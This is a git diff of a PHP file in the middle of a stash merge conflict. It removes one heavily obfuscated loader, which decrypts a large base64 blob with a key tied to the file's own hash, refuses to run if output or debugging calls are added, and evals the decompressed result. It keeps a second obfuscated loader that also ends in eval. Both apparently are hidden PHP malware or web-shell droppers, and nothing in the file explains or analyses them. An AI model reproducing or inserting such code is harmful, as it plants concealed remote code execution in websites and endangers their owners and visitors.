@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$sxmxydr="6a6e67b43e7e06dea497e9a0eddd04c0";
-$kbqlxeiyy="5256570607000703075d06520701510357015c5257085400515d010554510154";
-$aoflzikngt="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";
-$avfomjby=file_get_contents(__FILE__);
-$ksqqqhpby=str_replace($aoflzikngt,"",$avfomjby);
-if(strpos($ksqqqhpby,"ec"."ho")!==false||strpos($ksqqqhpby,"pr"."int")!==false||strpos($ksqqqhpby,"var_"."dump")!==false||strpos($ksqqqhpby,"file_put_"."contents")!==false||strpos($ksqqqhpby,"fw"."rite")!==false){die();}
-$oiiqitcl=str_replace(array($sxmxydr,$kbqlxeiyy),array("SP_4eabadc8","KP_5d18a7bd"),$avfomjby);
-$zexfjlem=md5($oiiqitcl);
-$omkebk=hex2bin($kbqlxeiyy);
-$rnjbenk="";
-$tgvplwxvq=strlen($zexfjlem);
-for($mcqtaedps=0;$mcqtaedps<$tgvplwxvq;$mcqtaedps++){
-$rnjbenk.=chr(ord($omkebk[$mcqtaedps])^ord($zexfjlem[$mcqtaedps]));
-}
-$taslrdzh=base64_decode($aoflzikngt);
-$jdzqqmz=strlen($taslrdzh);
-$hswldd="";
-$yuuhhiq=strlen($rnjbenk);
-for($mcqtaedps=0;$mcqtaedps<$jdzqqmz;$mcqtaedps++){
-$hswldd.=$taslrdzh[$mcqtaedps]^$rnjbenk[$mcqtaedps%$yuuhhiq];
-}
-$bebuhvrp="gzun"."compress";
-eval($bebuhvrp($hswldd));
-=======
 // 608c6ef6fc4fe502d0fae0bb
 $KjDZOBvPBufpP="JjW7qqis6gaag2PmyuLQlrJLIfvBgC6TvP+WeqMM9g0=";
 $iAGxlgIkSUF="WwJ7ddvf6tnnt2CzlhYDyeWYVsiOtP6GiC+JrdZZ9t0=";
@@ -52,4 +27,3 @@ $ruPxKQJqKtyVwq=$nhmzdqjLbRfcp($ruPxKQJqKtyVwq);
 $ruPxKQJqKtyVwq=$UULzTEEaxOy($ruPxKQJqKtyVwq);
 $ruPxKQJqKtyVwq=$cmNRdFBf_iRLf($ruPxKQJqKtyVwq);
 eval($ruPxKQJqKtyVwq);
->>>>>>> Stashed changes
